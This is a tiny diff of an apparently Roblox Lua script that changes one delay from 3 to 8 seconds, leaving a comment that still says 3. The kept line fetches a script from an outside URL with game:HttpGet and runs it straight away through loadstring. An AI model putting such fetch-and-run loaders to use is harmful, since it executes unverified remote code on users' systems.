@@ -4,7 +4,7 @@ delay(0, function()
 end)
 
 -- Script 2 (runs after 3 seconds)
-delay(3, function() 
+delay(8, function() 
     loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/0a9bc309a4ac30c88b21654f1d1344c73067ccce12900057b45d27a038c75b64/download"))() 
 end)
 
